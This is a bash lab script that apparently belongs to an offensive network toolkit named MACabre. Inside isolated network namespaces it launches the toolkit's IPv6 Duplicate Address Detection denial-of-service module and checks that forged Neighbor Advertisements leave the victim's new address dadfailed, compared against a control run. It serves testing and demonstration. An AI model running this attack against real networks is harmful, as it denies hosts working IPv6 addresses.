#!/usr/bin/env bash
# Isolated Duplicate Address Detection DoS lab (Linux only, needs root and IPv6 in the kernel).
#
# Topology, all inside network namespaces, two hosts on one link:
#
#   victim:   a host that configures a new address, so it runs Duplicate Address Detection (DAD).
#   attacker: answers the DAD with forged Neighbor Advertisements, through MACabre's module.
#
# Phases:
#   control: no attacker. The victim adds NEW_ADDR and waits for DAD to finish. The address must end up
#            configured: present, without the tentative or dadfailed flags.
#   attack:  the attacker starts a burst of NAs for NEW_ADDR, then the victim adds it during that burst.
#            The address must end up dadfailed, so the victim does not use it.
#
# The address is added without nodad, so the kernel runs DAD for it. The lab checks the address flags
# with ip -6 addr. Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/duplicate_address_detection_dos_lab.sh
#
# Exit 0 when control configures the address and attack marks it dadfailed.
# Exit 1 when either does not. Exit 2 when the setup failed.
#
# Requirements: iproute2 (ip), IPv6 in the kernel, and the project virtualenv (.venv) with scapy.
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip awk; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
VICTIM_MAC="02:00:00:00:00:10"
ATTACKER_MAC="02:00:00:00:00:30"
LINK_ADDR="2001:db8:1::10"
NEW_ADDR="2001:db8:1::50"
DAD_WAIT="${DAD_WAIT:-4}"       # seconds for DAD to finish; the default DAD window is about 1-2 s
BURST_FRAMES="${BURST_FRAMES:-60}"
BURST_INTERVAL="${BURST_INTERVAL:-0.1}"
ATTACKER_PID=""

stop_attacker() {
    if [[ -n "$ATTACKER_PID" ]] && kill -0 "$ATTACKER_PID" 2>/dev/null; then
        kill -TERM "$ATTACKER_PID" 2>/dev/null || true
        wait "$ATTACKER_PID" 2>/dev/null || true
    fi
    ATTACKER_PID=""
}

stop_lab() {
    stop_attacker
    for ns in attacker victim; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

build_topology() {
    stop_lab
    for ns in victim attacker; do
        ip netns add "$ns"
        ip netns exec "$ns" ip link set lo up
    done
    ip link add v0 type veth peer name a1
    ip link set v0 netns victim
    ip link set a1 netns attacker
    ip netns exec victim ip link set v0 address "$VICTIM_MAC"
    ip netns exec attacker ip link set a1 address "$ATTACKER_MAC"
    ip netns exec victim ip link set v0 up
    ip netns exec attacker ip link set a1 up
    # The victim keeps a link address, so DAD for NEW_ADDR runs on a link with a live neighbor.
    ip netns exec victim ip -6 addr add "$LINK_ADDR/64" dev v0 nodad
}

# Print the address line for NEW_ADDR, or nothing when the victim does not hold it.
address_line() {
    ip netns exec victim ip -6 addr show dev v0 | awk -v a="$NEW_ADDR" '$0 ~ a {print}'
}

echo "=== control ==="
build_topology
ip netns exec victim ip -6 addr add "$NEW_ADDR/64" dev v0
sleep "$DAD_WAIT"
control_line=$(address_line)
echo "victim's address after DAD: ${control_line:-none}"

echo "=== attack ==="
build_topology
ip netns exec attacker "$PY" -m macabre.attacks.duplicate_address_detection_dos a1 \
    --source-mac "$ATTACKER_MAC" --target "$NEW_ADDR" \
    --frames "$BURST_FRAMES" --interval "$BURST_INTERVAL" &
ATTACKER_PID=$!
sleep 0.5
ip netns exec victim ip -6 addr add "$NEW_ADDR/64" dev v0
sleep "$DAD_WAIT"
attack_line=$(address_line)
echo "victim's address after DAD: ${attack_line:-none}"
stop_attacker

echo
control_ok=0; attack_ok=0
if [[ -n "$control_line" && "$control_line" != *dadfailed* && "$control_line" != *tentative* ]]; then control_ok=1; fi
if [[ "$attack_line" == *dadfailed* ]]; then attack_ok=1; fi
echo "control: the address is configured: $([[ $control_ok == 1 ]] && echo yes || echo no)"
echo "attack:  the address is marked dadfailed: $([[ $attack_ok == 1 ]] && echo yes || echo no)"

if (( control_ok && attack_ok )); then
    echo "PASS: forged Neighbor Advertisements during DAD keep the new address from being configured."
    exit 0
fi
echo "FAIL: the DAD outcome did not match the expectation."
exit 1
